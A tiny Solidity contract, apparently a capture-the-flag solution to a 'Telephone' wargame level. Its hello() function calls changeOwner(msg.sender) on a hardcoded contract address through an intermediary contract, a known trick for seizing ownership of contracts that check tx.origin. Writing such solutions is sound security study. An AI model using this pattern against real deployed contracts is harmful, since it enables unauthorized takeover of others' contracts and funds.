// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Telephone {

  function hello() public {
    (bool success,) = 0x4a56Ba2Aa836B7C88351a9673b6db0cB2E49647F.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
    if (!success) {
        revert();
    }
  }
}